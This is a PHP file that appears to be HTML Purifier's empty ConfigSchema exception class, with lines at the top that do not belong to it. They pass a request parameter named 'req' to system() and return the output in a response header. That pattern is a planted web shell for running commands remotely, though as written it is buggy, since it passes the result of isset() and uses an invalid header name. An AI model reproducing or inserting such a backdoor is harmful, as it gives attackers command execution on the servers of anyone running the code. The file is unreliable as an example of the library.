<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

/**
 * Exceptions related to configuration schema
 */
class HTMLPurifier_ConfigSchema_Exception extends HTMLPurifier_Exception
{

}

// vim: et sw=4 sts=4
